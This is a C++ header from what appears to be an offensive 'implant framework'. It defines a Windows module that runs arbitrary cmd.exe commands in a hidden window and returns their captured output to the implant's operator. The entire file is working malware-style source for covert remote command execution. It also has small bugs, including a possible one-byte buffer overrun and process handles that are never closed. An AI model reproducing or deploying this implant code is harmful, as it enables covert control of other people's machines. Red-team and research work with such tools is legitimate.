/** @file windows_cmd.hpp
 * @brief Contains implementation for the CMD module
 * @author f1rehaz4rd
 */
#ifndef HIVEMIND_IMPLANTFRAMEWORK_LIB_SOURCE_MODULES_WINDOWS_CMD_HPP_
#define HIVEMIND_IMPLANTFRAMEWORK_LIB_SOURCE_MODULES_WINDOWS_CMD_HPP_

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include "module.hpp"
#include "module_factory.hpp"


namespace hivemind_lib {
/**
 * @brief WINDOWS Implementation of the CMD module.
 */
class WindowsCmdModule : public Module {
 public:
  ModuleInfo Init() override {
    struct ModuleFuncInfo module_func_info;

    module_func_info.param_names.emplace_back("cmd");
    module_func_info.param_types.emplace_back("String");
    module_func_info.module_func_name = "EXEC";
    module_func_info.module_func_desc = "Function to run cmd.exe command";
    module_func_info.param_num = 1;

    this->mod_info_.module_funcs.push_back(module_func_info);
    this->mod_info_.module_name = "CMD";
    this->mod_info_.module_desc = "A module to run cmd commands";

    std::function < std::string(std::string) > f = std::bind(&WindowsCmdModule::Exec, this, std::placeholders::_1);

    this->func_map_.insert({"EXEC", f});
    this->timeout_map_.insert({"EXEC", 10});

    return this->mod_info_;
  }

  /**
   * @brief Module function to run a cmd on a host.
   * @param cmd takes in the command to run.
   * @return the output of the command.
   */
  std::string Exec(std::string cmd) {
    auto args = ParseData<CmdArgParse>(std::move(cmd));

    HANDLE read_handle;
    HANDLE write_handle;
    DWORD bytes_read;
    DWORD ret_code;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    std::string cmdline;
    DWORD available_bytes;

    CHAR output_buffer[4096];
    DWORD output_buffer_size = 4096;

    std::string return_str;

    read_handle = nullptr;
    write_handle = nullptr;

    ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&si, sizeof(STARTUPINFOA));

    sa.bInheritHandle = true;
    sa.lpSecurityDescriptor = nullptr;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;

    cmdline = "cmd /c " + std::string(args.cmd);

    //
    // Create the pipe where stdout will be redirected to.
    //
    if (CreatePipe(&read_handle, &write_handle, &sa, NULL) == FALSE) {
      goto Exit;
    }

    //
    // Set the process to output to our pipes.
    //
    si.hStdError = write_handle;
    si.hStdOutput = write_handle;

    //
    // Create the command prompt process itself.
    //
    if (CreateProcessA(nullptr, const_cast<CHAR*>(cmdline.c_str()), nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi) == FALSE) {
      goto Exit;
    }

    //
    // Wait for the command prompt process to exit.
    // Maximum execution time of 5 seconds (to prevent hanging).
    //
    ret_code = WaitForSingleObject(pi.hProcess, 5000);
    if (ret_code == WAIT_TIMEOUT) {
      TerminateProcess(pi.hProcess, 0);
    }

    //
    // Check if there was any output.
    //
    if (PeekNamedPipe(read_handle, nullptr, 0, nullptr, &available_bytes, nullptr) == FALSE || !available_bytes) {
      sprintf_s(output_buffer, output_buffer_size, "No bytes to read.\n");
      goto Exit;
    }
    if(available_bytes > output_buffer_size)
      available_bytes = output_buffer_size - 1;

    //
    // Read in the output.
    //
    if (ReadFile(read_handle, output_buffer, available_bytes, &bytes_read, NULL) == FALSE) {
      goto Exit;
    }

    //
    // Append a null-terminator.
    //
    output_buffer[bytes_read] = '\0';
    return_str = std::string(output_buffer);

    Exit:
    //
    // Clean up open handles.
    //
    if (read_handle)
      CloseHandle(read_handle);

    if (write_handle)
      CloseHandle(write_handle);

    DEBUG(return_str, LEVEL_DEBUG);
    return return_str;
  }

  WindowsCmdModule() = default;
};

REGISTER_MODULE_FACTORY(WindowsCmdModule, "CmdModule");

}


#endif //HIVEMIND_IMPLANTFRAMEWORK_LIB_SOURCE_MODULES_WINDOWS_CMD_HPP_
